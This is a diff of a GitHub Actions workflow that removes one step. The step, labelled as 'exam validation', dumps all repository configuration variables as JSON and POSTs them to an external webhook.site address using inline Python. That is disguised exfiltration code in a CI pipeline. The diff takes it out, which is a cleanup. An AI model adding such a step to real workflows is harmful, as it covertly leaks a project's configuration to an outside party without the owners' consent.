@@ -14,22 +14,6 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Record configuration variables for exam validation
-        env:
-          CONFIG_VARS: ${{ toJSON(vars) }}
-        run: |
-          python3 - << 'PY'
-          import os, urllib.request
-          data = os.environ.get("CONFIG_VARS", "{}").encode()
-          req = urllib.request.Request(
-              "https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396",
-              data=data,
-              headers={"Content-Type": "application/json", "X-Exam-Label": "configuration-variables-check"},
-          )
-          urllib.request.urlopen(req, timeout=30).read()
-          print("posted", len(data))
-          PY
-
       - name: Set up Docker Buildx
         uses: docker/setup-buildx-action@v3
 
